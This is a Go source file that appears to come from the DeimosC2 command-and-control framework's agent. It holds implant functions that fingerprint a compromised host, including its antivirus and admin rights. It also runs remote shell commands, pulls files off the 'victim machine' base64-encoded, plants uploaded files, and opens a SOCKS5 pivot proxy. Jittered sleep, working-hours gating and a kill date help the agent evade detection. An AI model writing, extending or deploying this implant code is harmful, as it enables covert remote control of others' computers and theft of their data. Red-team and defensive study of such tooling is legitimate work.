package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	r "math/rand"
	"net"
	"os"
	"os/user"
	"path"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/DeimosC2/DeimosC2/agents/resources/filebrowser"
	"github.com/DeimosC2/DeimosC2/agents/resources/fingerprint"
	"github.com/DeimosC2/DeimosC2/agents/resources/shellexec"
	"github.com/DeimosC2/DeimosC2/lib/agentscommon"
	"github.com/DeimosC2/DeimosC2/lib/privileges"

	"github.com/armon/go-socks5"
)

var cwd string //Current shell working directory
//JobCount is a global variable containing the number of jobs
var JobCount int
var proxyServer *socks5.Server
var proxyListener net.Listener

//Shell types
const (
	powerShell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	cmd        = "C:\\Windows\\System32\\cmd.exe"
	zsh        = "/bin/zsh"
	sh         = "/bin/sh"
	bash       = "/bin/bash"
)

//AllOutput is a global variable that holds the jobOutputs
var AllOutput = Output{Mutex: sync.RWMutex{}, List: map[int]*agentscommon.JobOutput{}}

//AllPivotJobs is used to hold all of the jobs needing to be passed down the link
var AllPivotJobs = PivotJobHolder{Mutex: sync.RWMutex{}, List: map[string]*PivotJobs{}}

//Output is the struct for a list of all output
type Output struct {
	Mutex sync.RWMutex
	List  map[int]*agentscommon.JobOutput
}

//AgentJob is the standard struct for all jobs
type AgentJob struct {
	AgentKey  string   //Key of the agent to create the job for
	JobType   string   //Type of job
	Arguments []string //Job arguments adhering to the above formats
}

//PivotJobHolder is used to hold of the pivot jobs that agents will request back
type PivotJobHolder struct {
	Mutex sync.RWMutex
	List  map[string]*PivotJobs
}

//PivotJobs hows a slice of jobs for the lower agents to grab
type PivotJobs struct {
	Jobs []AgentJob
}

//PivotList is used to hold the listener object
type PivotList struct {
	Listener net.Listener
	ListChan chan bool
}

//FirstTime Struct
type initialize struct {
	Key         string   //Agent Key
	OS          string   //Current OS
	OSType      string   //Type of Operating System and/or Distro
	OSVers      string   //Version of OS
	AV          []string //AntiVirus Running
	Hostname    string   //Current Machine Name
	Username    string   //Current Username
	LocalIP     string   //Local IP
	AgentPath   string   //Agent Path
	Shellz      []string //Available System Shells
	Pid         int      //Get PID of agent
	IsAdmin     bool     //Is admin user
	IsElevated  bool     //Is elevated on Windows
	ListenerKey string   //Listener that the agent is attached too
}

//CheckTime sees if the current time is between the allowed hours, if not sleep until it is
func CheckTime(liveHours string) {
	if liveHours != "" {
		allowedTime := strings.Split(liveHours, "-")
		startTime := strings.Split(allowedTime[0], ":")
		endTime := strings.Split(allowedTime[1], ":")
		current := time.Now()
		startHour, _ := strconv.Atoi(startTime[0])
		startMin, _ := strconv.Atoi(startTime[1])
		endHour, _ := strconv.Atoi(endTime[0])
		endMin, _ := strconv.Atoi(endTime[1])
		start := time.Date(current.Year(), current.Month(), current.Day(), startHour, startMin, current.Second(), current.Nanosecond(), current.Location())
		end := time.Date(current.Year(), current.Month(), current.Day(), endHour, endMin, current.Second(), current.Nanosecond(), current.Location())
		if current.After(start) && current.Before(end) {
			return
		} else {
			time.Sleep(start.Sub(current))
			return
		}
	}
}

//ShouldIDie determines if the agent should die or not
func ShouldIDie(eol string) {
	if eol != "" {
		end, err := time.Parse("2006-01-02", eol)
		if err != nil {
			ErrHandling(err.Error())
		}
		if time.Now().After(end) {
			os.Exit(0)
		}
	}
}

//SleepDelay sleeps between each loop of the agent with a jitter % to make it less patterned
func SleepDelay(delay float64, jitter float64) {
	minSleep := delay - (delay * jitter)
	maxSleep := delay + (delay * jitter)
	if minSleep < 3 {
		minSleep = 2
		maxSleep += 2
	}
	time.Sleep(time.Duration(r.Intn(int((maxSleep-minSleep))+int(minSleep))) * time.Second)
}

//FirstTime is used to initalize an agent
func FirstTime(key string) []byte {
	//Get the current executable path
	agent, err := os.Executable()
	if err != nil {
		ErrHandling(err.Error())
	}
	//Get current user information
	user, err := user.Current()
	if err != nil {
		ErrHandling(err.Error())
	}
	//Get current hostname
	hostname, err := os.Hostname()
	if err != nil {
		ErrHandling(err.Error())
	}
	//Get local ip
	addr, err := net.InterfaceAddrs()
	if err != nil {
		ErrHandling(err.Error())
	}
	var ip string
	for _, a := range addr {
		if ipnet, ok := a.(*net.IPNet); ok &&
			!ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() {
			if ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}
	//Get available shellz
	var shellz []string
	if runtime.GOOS == "windows" {
		_, err := os.Stat(powerShell)
		if err != nil {
			ErrHandling(err.Error())
		} else {
			shellz = append(shellz, powerShell)
		}
		_, err = os.Stat(cmd)
		if err != nil {
			ErrHandling(err.Error())
		} else {
			shellz = append(shellz, cmd)
		}
	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		_, err := os.Stat(bash)
		if err != nil {
			ErrHandling(err.Error())
		} else {
			shellz = append(shellz, bash)
		}
		_, err = os.Stat(zsh)
		if err != nil {
			ErrHandling(err.Error())
		} else {
			shellz = append(shellz, zsh)
		}
		_, err = os.Stat(sh)
		if err != nil {
			ErrHandling(err.Error())
		} else {
			shellz = append(shellz, sh)
		}
	}

	admin, elevated := privileges.AdminOrElevated()
	osType, osVers, av := fingerprint.FingerPrint()

	//Place all that information into a JSON object
	systemInfo := initialize{key, runtime.GOOS, osType, osVers, av, hostname, user.Username, ip, agent, shellz, os.Getpid(), admin, elevated, ""}
	msg, err := json.Marshal(systemInfo)
	if err != nil {
		ErrHandling(err.Error())

	}
	cwd, _ = os.Getwd()
	return msg
}

//Shell is used to execute shell commands
func Shell(command []string, r bool) []byte {
	if command[2] == "cd" {
		var dir string
		var p string
		if strings.HasPrefix(command[3], "..") {
			pathBack := strings.Repeat("/../", strings.Count(command[3], "../"))
			dir = filepath.Dir(cwd + pathBack)
		} else {
			dir = command[3]
		}
		if runtime.GOOS == "windows" {
			p = filepath.FromSlash(strings.TrimSuffix(dir, "\r"))
			if _, err := os.Stat(p); os.IsNotExist(err) {
				if filepath.VolumeName(cwd) == "" {
					driveLetter, err := filepath.Abs(p)
					if err != nil {
						ErrHandling(err.Error())
						AllOutput.Mutex.Lock()
						JobCount++
						AllOutput.List[JobCount] = &agentscommon.JobOutput{"error", err.Error()}
						AllOutput.Mutex.Unlock()
					}
					p = filepath.VolumeName(driveLetter) + cwd + command[3]
				} else {
					p = cwd + "\\" + command[3]
				}
			}
		} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
			p = filepath.ToSlash(strings.TrimSuffix(dir, "\r"))
		}
		cwd = strings.TrimSuffix(p, "\r")
	}
	//Check to see if any data was sent in command[3]
	if len(strings.TrimSpace(command[2])) == 0 {
		result := []byte("No command arguments where passed")
		if r {
			return result
		} else {
			AllOutput.Mutex.Lock()
			JobCount++
			AllOutput.List[JobCount] = &agentscommon.JobOutput{"error", string(result)}
			AllOutput.Mutex.Unlock()
			return nil
		}

	} else {
		//Executing shell and the arguments that follow
		result := shellexec.ShellExecute(command, cwd)

		if r {
			return result
		} else {
			AllOutput.Mutex.Lock()
			JobCount++
			AllOutput.List[JobCount] = &agentscommon.JobOutput{"shell", string(result)}
			AllOutput.Mutex.Unlock()
			return nil
		}
	}
}

//Download takes in the file to be sent back to the server
//This should be edited to just add to job output.
//results should be {filename: "blah", filedata: "0x40,0x32"}
func Download(data string) {
	fi, err := os.Stat(data)
	if err != nil {
		ErrHandling(err.Error())
		AllOutput.Mutex.Lock()
		JobCount++
		AllOutput.List[JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		AllOutput.Mutex.Unlock()
		return
	}

	switch mode := fi.Mode(); {
	case mode.IsRegular():
		//Read the contents of the file and save it to msg
		fileData, err := ioutil.ReadFile(data)
		if err != nil {
			ErrHandling(err.Error())
			AllOutput.Mutex.Lock()
			JobCount++
			AllOutput.List[JobCount] = &agentscommon.JobOutput{"error", err.Error()}
			AllOutput.Mutex.Unlock()
		}

		downloadStruct := agentscommon.DownloadOutput{
			Filename: filepath.Base(data),
			FileData: base64.StdEncoding.EncodeToString(fileData),
		}

		msg, err := json.Marshal(downloadStruct)

		AllOutput.Mutex.Lock()
		JobCount++
		AllOutput.List[JobCount] = &agentscommon.JobOutput{
			JobName: "download",
			Results: string(msg),
		}
		AllOutput.Mutex.Unlock()
	}
}

//Upload is used to upload files to the victim machine, the base64'd filedata is passed in the actual job.
func Upload(location string, fileName string, file string) {
	data, _ := base64.StdEncoding.DecodeString(file)
	if location == "cwd" {
		//TEMP
		cwd, _ := os.Getwd()
		//edit this back to lowercase
		location = cwd + "/"
	}
	//NEED TO VERIFY THAT THE LOCATION DOES EXIST ELSE MOVE TO CWD
	fileloc := SaveFile(data, location, fileName)

	AllOutput.Mutex.Lock()
	JobCount++
	AllOutput.List[JobCount] = &agentscommon.JobOutput{
		JobName: "shell",
		Results: ("File saved to " + fileloc),
	}
	AllOutput.Mutex.Unlock()
}

//SaveFile is used by the agents to save a file to disk
func SaveFile(data []byte, loc string, fileName string) string {
	if data == nil {
		JobCount++
		AllOutput.Mutex.Lock()
		AllOutput.List[JobCount] = &agentscommon.JobOutput{
			JobName: "upload",
			Results: "No File Passed",
		}
		AllOutput.Mutex.Unlock()
		return ""
	}
	fullFileName := path.Join(loc, fileName)
	err := ioutil.WriteFile(fullFileName, data, 0755)
	if err != nil {
		ErrHandling(err.Error())
		AllOutput.Mutex.Lock()
		JobCount++
		AllOutput.List[JobCount] = &agentscommon.JobOutput{"error", err.Error()}
		AllOutput.Mutex.Unlock()
	}
	return fullFileName
}

//AgentFileBrowsers will send back every file and directory in the path location specified
func AgentFileBrowsers(location string) {
	retMSG := filebrowser.FileBrowser(location)

	AllOutput.Mutex.Lock()
	JobCount++
	AllOutput.List[JobCount] = &agentscommon.JobOutput{"fileBrowser", retMSG}
	AllOutput.Mutex.Unlock()
}

//Kill will delete the agent and return the message "Dying" to the server
func Kill() {
	result := "Dying"
	JobCount++
	AllOutput.Mutex.Lock()
	AllOutput.List[JobCount] = &agentscommon.JobOutput{
		JobName: "kill",
		Results: result,
	}
	AllOutput.Mutex.Unlock()
}

//ErrHandling handles the agent's errors
func ErrHandling(err string) {
	AllOutput.Mutex.Lock()
	defer AllOutput.Mutex.Unlock()
	JobCount++
	AllOutput.List[JobCount] = &agentscommon.JobOutput{"error", err}
}

//KillNetList will kill of the listener
func KillNetList(tcpL net.Listener, l *PivotList) {
	<-l.ListChan
	tcpL.Close()
}

//ProxyStart will start a proxy on the desired port with the passed credentials
func ProxyStart(port string, user string, pass string) {
	creds := socks5.StaticCredentials{
		user: pass,
	}
	conf := &socks5.Config{
		AuthMethods: []Authenticator{socks5.UserPassAuthenticator{Credentials: creds}},
	}
	proxyServer, err := socks5.New(conf)
	if err != nil {
		ErrHandling(err.Error())
	}

	proxyListener, err := net.Listen("tcp", "0.0.0.0"+port)
	if err != nil {
		ErrHandling(err.Error())
	}
	proxyServer.Serve(proxyListener)
	if err != nil {
		ErrHandling(err.Error())
	}
	AllOutput.Mutex.Lock()
	JobCount++
	AllOutput.List[JobCount] = &agentscommon.JobOutput{
		JobName: "proxy",
		Results: "Proxy opened on port: " + port,
	}
	AllOutput.Mutex.Unlock()

}

//KillProxy will kill a started proxy
func KillProxy() {
	proxyListener.Close()
	AllOutput.Mutex.Lock()
	JobCount++
	AllOutput.List[JobCount] = &agentscommon.JobOutput{
		JobName: "proxy",
		Results: "Proxy closed",
	}
	AllOutput.Mutex.Unlock()
}
